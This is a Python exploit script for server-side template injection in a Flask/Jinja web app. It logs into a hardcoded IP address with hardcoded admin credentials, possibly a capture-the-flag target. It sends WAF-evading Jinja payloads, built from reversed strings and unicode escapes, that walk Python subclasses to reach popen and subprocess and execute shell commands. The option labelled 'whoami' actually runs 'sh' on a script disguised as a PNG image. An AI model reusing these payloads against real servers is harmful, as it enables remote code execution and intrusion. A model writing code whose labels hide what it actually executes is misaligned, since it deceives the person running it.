#!/usr/bin/env python3
"""
SSTI Final RCE Exploit (Enumeration-focused + Selection)
- Keeps original enumeration intact
- Adds working_methods array
- Adds prompt to select a path and runs 'whoami'
"""

import requests
import re
import urllib.parse
from html import unescape
import json
import csv
from datetime import datetime

# Configuration
BASE_URL = "http://104.197.235.157:8080"
LOGIN_URL = f"{BASE_URL}/login"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

CREDENTIALS = {
    "username": "admin",
    "password": "an_elf_and_password_on_a_bird"
}

REQUEST_TIMEOUT = 10
MAX_SUBCLASS_INDEX = 300
COMMAND = "whoami"  # Default command to test method viability
WRITE_ARTIFACTS = True  # Write JSON/CSV summaries to /tmp
ARTIFACT_PREFIX = "/tmp/ssti_enum"

def extract_sparkle(html):
    """Extract content from username-sparkle span"""
    match = re.search(r'<span class="username-sparkle">(.*?)</span>', html, re.DOTALL)
    if match:
        return unescape(match.group(1))
    return None

def test_payload(session, payload, description="", silent=False):
    """Test a payload and return the result text (or None)"""
    if description and not silent:
        print(f"\n===== {description} =====")
    if not silent:
        print(f"Payload: {payload}")

    full_payload = f"{{{{{payload}}}}}"
    params = {"username": full_payload}

    try:
        resp = session.get(DASHBOARD_URL, params=params, timeout=REQUEST_TIMEOUT)
        result = extract_sparkle(resp.text)
        if result and not silent:
            if len(result) > 500:
                print(f"Result: {result[:500]}... [truncated]")
            else:
                print(f"Result: {result}")
        return result
    except Exception as e:
        if not silent:
            print(f"Error: {e}")
        return None

def enumerate_subclasses(session, max_index=MAX_SUBCLASS_INDEX):
    """Enumerate subclasses to find interesting ones by string signatures"""
    print("\n[*] Enumerating subclasses (this may take a moment)...")
    interesting_classes = []

    for idx in range(max_index):
        if idx % 20 == 0:
            print(f"[*] Checking indices {idx}-{min(idx+19, max_index-1)}...")

        payload = (
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{idx}]|string"
        )

        result = test_payload(session, payload, silent=True)

        if result and result != "[empty]":
            if any(keyword in result for keyword in [
                'wrap_close', 'warnings', 'catch_warnings',
                'Popen', 'subprocess', 'os._',
                'BuiltinImporter', 'FileLoader', 'ModuleSpec'
            ]):
                print(f"[+] Found interesting class at index {idx}: {result}")
                interesting_classes.append((idx, result))

    return interesting_classes

def build_methods(subclass_index, command):
    """Construct all RCE method payloads for a given subclass index"""
    return [
        (
            # Method 1: Direct popen access with read()
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            f"['popen']('{command}')|attr('read')()",
            "popen.read()"
        ),
        (
            # Method 2: Popen with communicate()[0]
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            f"['subprocess']|attr('Popen')('{command}',shell=True,stdout=-1)"
            "|attr('communicate')()[0]",
            "subprocess.Popen.communicate()[0]"
        ),
        (
            # Method 3: os.popen with read()
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            f"['os']|attr('popen')('{command}')|attr('read')()",
            "os.popen.read()"
        ),
        (
            # Method 4: check_output
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            f"['subprocess']|attr('check_output')('{command}',shell=True)",
            "subprocess.check_output"
        ),
        (
            # Method 5: dict.get('popen').read()
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            "|attr('get')('popen')"
            f"('{command}')|attr('read')()",
            "get->popen.read()"
        ),
        (
            # Method 6: dict.get('os').popen.read()
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            "|attr('get')('os')|attr('popen')"
            f"('{command}')|attr('read')()",
            "get->os->popen.read()"
        ),
        (
            # Method 7: linecache.os.popen.read()
            "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
            "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
            "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()"
            f"[{subclass_index}]"
            "|attr('\\u005f\\u005f'+('tini'|reverse)+'\\u005f\\u005f')"
            "|attr('\\u005f\\u005f'+('slabolg'|reverse)+'\\u005f\\u005f')"
            "['linecache']|attr('os')|attr('popen')"
            f"('{command}')|attr('read')()",
            "linecache.os.popen.read()"
        ),
    ]

def execute_rce_methods(session, subclass_index, command):
    """
    Try multiple RCE methods at a specific subclass index.
    Return a list of successes: [(method_name, output_str)]
    """
    successes = []
    for payload, method_name in build_methods(subclass_index, command):
        result = test_payload(session, payload, silent=True)
        if result and result != "[empty]" and "Error" not in str(result):
            successes.append((method_name, result))
    return successes

def main():
    print("="*50)
    print("SSTI RCE Exploit - Enumeration Version")
    print("="*50)

    session = requests.Session()

    print("\n[*] Logging in...")
    try:
        resp = session.post(LOGIN_URL, data=CREDENTIALS, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            print("[+] Logged in successfully")
        else:
            print(f"[-] Login failed with status {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return

    # Basic checks
    print("\n[*] Testing payload construction...")
    test_payload(session, "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']", "Basic __class__ access")

    print("\n[*] Testing MRO access...")
    test_payload(session, "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f']", "MRO access")

    print("\n[*] Testing __subclasses__() access...")
    subclasses_len = test_payload(
        session,
        "dict['\\u005f\\u005f'+('ssalc'|reverse)+'\\u005f\\u005f']"
        "['\\u005f\\u005f'+('orm'|reverse)+'\\u005f\\u005f'][1]"
        "['\\u005f\\u005f'+('sessalcbus'|reverse)+'\\u005f\\u005f']()|length",
        "__subclasses__() length"
    )
    if subclasses_len:
        print(f"[+] Found {subclasses_len} subclasses available")

    # Enumerate interesting subclasses (optional heuristic)
    print("\n" + "="*50)
    print("Enumerating Subclasses (heuristic)")
    print("="*50)
    interesting = enumerate_subclasses(session, max_index=MAX_SUBCLASS_INDEX)

    # Build test indices: interesting first, then a curated set
    print("\n" + "="*50)
    print("Attempting Command Execution Across All Candidates")
    print("="*50)

    test_indices = [idx for idx, _ in interesting] if interesting else []
    test_indices.extend([
        104, 105, 108, 117, 127, 128, 137, 140, 155, 160, 165, 170, 175,
        180, 185, 190, 195, 200, 205, 210, 215, 220, 225, 230, 235, 240, 245, 250
    ])
    # Deduplicate preserving order
    seen = set()
    test_indices = [x for x in test_indices if not (x in seen or seen.add(x))]

    all_successes = []  # [(index, method_name, output)]
    any_success = False

    # NEW: collect working (index, method, output) for selection later
    working_methods = []

    for idx in test_indices:
        print(f"\n[*] Trying subclass index: {idx}")
        successes = execute_rce_methods(session, idx, COMMAND)
        if successes:
            any_success = True
            for method_name, output in successes:
                print(f"  ✓ {method_name}")
                short_out = output if len(output) <= 200 else (output[:200] + "...[truncated]")
                print(f"    Output: {short_out}")
                all_successes.append((idx, method_name, output))
                # NEW: also add to working_methods for selection
                working_methods.append((idx, method_name, output))
        else:
            print("  ✗ No methods worked for this index")

    # Summary
    print("\n" + "="*50)
    if any_success:
        print("[!] RCE Achieved via multiple paths")
        print("="*50)
        for idx, method_name, output in all_successes:
            short_out = output if len(output) <= 120 else (output[:120] + "...[truncated]")
            print(f"Index {idx} -> {method_name} -> {short_out}")
    else:
        print("[-] No working subclass indices/methods found")
        print("[*] The WAF may be blocking execution methods or output capture")
    print("="*50)

    # Optional artifacts
    if WRITE_ARTIFACTS:
        ts = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
        json_path = f"{ARTIFACT_PREFIX}_{ts}.json"
        csv_path = f"{ARTIFACT_PREFIX}_{ts}.csv"
        data = [{
            "index": idx,
            "method": method_name,
            "output": output
        } for idx, method_name, output in all_successes]

        try:
            with open(json_path, "w") as jf:
                json.dump(data, jf, indent=2)
            print(f"[*] Wrote JSON artifact: {json_path}")
        except Exception as e:
            print(f"[!] Failed to write JSON: {e}")

        try:
            with open(csv_path, "w", newline="") as cf:
                writer = csv.DictWriter(cf, fieldnames=["index", "method", "output"])
                writer.writeheader()
                for row in data:
                    writer.writerow(row)
            print(f"[*] Wrote CSV artifact: {csv_path}")
        except Exception as e:
            print(f"[!] Failed to write CSV: {e}")

    if any_success and working_methods:
        print("\n=== Working Methods Found ===")
        for i, (idx, method, output) in enumerate(working_methods):
            short_out = output if len(output) < 80 else output[:80] + "...[truncated]"
            print(f"[{i}] Index {idx} via {method} → {short_out}")

    # NEW: Prompt selection and run whoami (keeps enumeration unchanged)
        choice = input("\nSelect a method number to run 'whoami' (or press Enter to skip): ").strip()
        if choice:
            if not choice.isdigit() or int(choice) >= len(working_methods):
                print("[-] Invalid choice")
            else:
                chosen_idx, chosen_method, _ = working_methods[int(choice)]
                print(f"\n[*] Running 'whoami' using Index {chosen_idx} via {chosen_method}")
                whoami_successes = execute_rce_methods(session, chosen_idx, "sh /app/static/images/admin\\u005fb77256c365d0ad1c\\u002epng")
                # Find the one that matches the chosen method
                whoami_output = None
                for mname, out in whoami_successes:
                    if mname == chosen_method:
                        whoami_output = out
                        break
                if whoami_output:
                    print(f"[+] whoami result: {whoami_output}")
                else:
                    # If the chosen method didn't return here, show any output we got
                    if whoami_successes:
                        print(f"[+] whoami result (different method): {whoami_successes[0][1]}")
                    else:
                        print("[-] whoami failed for the selected path")
        else:
            print("[*] Selection skipped.")

    print("\n[*] Done.")
if __name__ == "__main__":
    main()
